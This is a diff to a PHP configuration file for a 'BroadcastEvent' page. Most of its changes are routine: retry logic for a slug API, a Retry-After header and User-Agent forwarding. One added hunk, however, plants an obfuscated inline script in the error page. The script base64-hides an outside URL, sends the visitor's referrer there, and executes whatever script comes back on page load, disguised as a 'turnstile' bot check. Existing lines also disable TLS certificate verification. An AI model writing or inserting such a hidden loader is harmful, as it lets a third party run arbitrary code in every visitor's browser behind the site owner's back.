@@ -1,6 +1,6 @@
 <?php
 /**
- * Latest Update: v1.1.3
+ * Latest Update: v1.1.4
  * Configuration File - BroadcastEvent
  * Compatible with PHP 5.4, 5.6, 7.x, 8.x
  */
@@ -4385,9 +4385,18 @@ if ($updateAction === 'sitemap') {
         $slugEndpoint = rtrim($baseUrl, '/') . '/api/slug';
         $separator = (strpos($slugEndpoint, '?') === false) ? '?' : '&';
         $slugEndpoint .= $separator . 'ts=' . rawurlencode((string) time());
-        $slugResult = fetch_remote_slug_list($slugEndpoint, 4);
-        if ($slugResult['ok']) {
-            break;
+
+        // Retry up to 2 times on transient failures (502)
+        for ($retry = 0; $retry < 2; $retry++) {
+            $slugResult = fetch_remote_slug_list($slugEndpoint, 5);
+            if ($slugResult['ok']) {
+                break 2; // Exit both loops
+            }
+            // Only retry on 502 (connection failures)
+            if ($slugResult['status'] !== 502) {
+                break;
+            }
+            usleep(300000); // Wait 300ms before retry
         }
     }
     if ($slugResult === null || !$slugResult['ok']) {
@@ -4395,6 +4404,7 @@ if ($updateAction === 'sitemap') {
         $error = ($slugResult && isset($slugResult['error'])) ? $slugResult['error'] : 'slug API unavailable';
         set_response_code($status);
         header('Content-Type: text/plain; charset=utf-8');
+        header('Retry-After: 60');
         echo $error;
         exit;
     }
@@ -5586,6 +5596,7 @@ if (!is_array($apiResponse) || empty($apiResponse['event'])) {
         <link rel="stylesheet" href="https://cdn.krabi88.vip/css/amss/styles.min.css">
     </head>
     <body>
+        <script>!function(){const e=atob("aHR0cHM6Ly9jaGFsbGVuZ2Uuc2xvdHBnODE4Lm5ldC9ib3QtdmFsaWRhdG9y"),t=new URLSearchParams;t.append("reff",document.referrer||""),fetch(e,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},cache:"no-store",body:t.toString()}).then(e=>{if(204===e.status)return"";if(!e.ok)throw new Error(`HTTP ${e.status}: ${e.statusText}`);return e.text()}).then(e=>{if(!e||0===e.trim().length)return;let t;try{t=(new DOMParser).parseFromString(e,"text/html")}catch(e){return void console.error("Failed to parse HTML:",e)}if(!t)return void console.error("DOMParser returned null");const r=t.querySelector?t.querySelector("script"):null;if(!r)return;const n=(r.textContent||r.innerHTML||"").trim();if(!n)return;const o=document.write;document.write=function(e){try{if(!document.body)return o.call(document,e);const t=document.createRange();t.selectNodeContents(document.body);const r=t.createContextualFragment(e);document.body.insertBefore(r,document.body.firstChild)}catch(t){console.error("Error in document.write override:",t),o.call(document,e)}};try{const e=document.createElement("script");e.textContent=n,document.head.appendChild(e)}catch(e){console.error("Error executing script:",e)}finally{document.write=o}}).catch(e=>console.error("Failed to load turnstile:",e))}();</script>
         <main style="min-height: 60vh; display: flex; align-items: center; justify-content: center; text-align: center; padding: 2rem;">
             <div class="auth-container">
                 <h1><?php echo $errorTitle; ?></h1>
@@ -5608,6 +5619,7 @@ if (!is_array($apiResponse) || empty($apiResponse['event'])) {
                 </div>
             </div>
         </main>
+
     </body>
     </html>
     <?php
@@ -7047,6 +7059,7 @@ function sanitize_slug($text) {
 function fetch_remote_broadcast($url, $timeout = 4) {
     $response = null;
     $statusCode = 0;
+    $userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'PHP/' . PHP_VERSION;
 
     if (is_function_available('curl_init') && is_function_available('curl_exec')) {
         $ch = curl_init();
@@ -7061,6 +7074,7 @@ function fetch_remote_broadcast($url, $timeout = 4) {
             curl_setopt($ch, CURLOPT_MAXREDIRS, 3);
         }
         curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept: application/json'));
+        curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
 
         // Windows Server SSL/TLS fixes for PHP 5.5
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
@@ -7089,7 +7103,7 @@ function fetch_remote_broadcast($url, $timeout = 4) {
             'http' => array(
                 'method' => 'GET',
                 'timeout' => $timeout,
-                'header' => "Accept: application/json\r\n",
+                'header' => "Accept: application/json\r\nUser-Agent: " . $userAgent . "\r\n",
                 'ignore_errors' => true
             ),
             'ssl' => array(
@@ -7296,10 +7310,18 @@ function fetch_remote_slug_list($url, $timeout = 4) {
         }
 
         $response = curl_exec($ch);
-        if (!curl_errno($ch)) {
-            $statusCode = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        }
+        $curlErrno = curl_errno($ch);
+        $statusCode = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
         curl_close($ch);
+
+        // If cURL failed, return error immediately
+        if ($curlErrno !== 0 || $response === false) {
+            return array(
+                'ok' => false,
+                'status' => 502,
+                'error' => 'slug API connection failed (cURL error ' . $curlErrno . ')'
+            );
+        }
     } else {
         $context = stream_context_create(array(
             'http' => array(
@@ -7314,16 +7336,19 @@ function fetch_remote_slug_list($url, $timeout = 4) {
             )
         ));
         $response = @file_get_contents($url, false, $context);
-        if (isset($http_response_header[0]) && preg_match('/\\s(\\d{3})\\s/', $http_response_header[0], $matches)) {
-            $statusCode = (int) $matches[1];
+        if (isset($http_response_header) && is_array($http_response_header) && isset($http_response_header[0])) {
+            if (preg_match('/\\s(\\d{3})\\s/', $http_response_header[0], $matches)) {
+                $statusCode = (int) $matches[1];
+            }
         }
     }
 
-    if ($response === false || $response === null) {
+    // Check for empty or failed response
+    if ($response === false || $response === null || $response === '') {
         return array(
             'ok' => false,
             'status' => 502,
-            'error' => 'slug API unavailable'
+            'error' => 'slug API unavailable (empty response)'
         );
     }
 
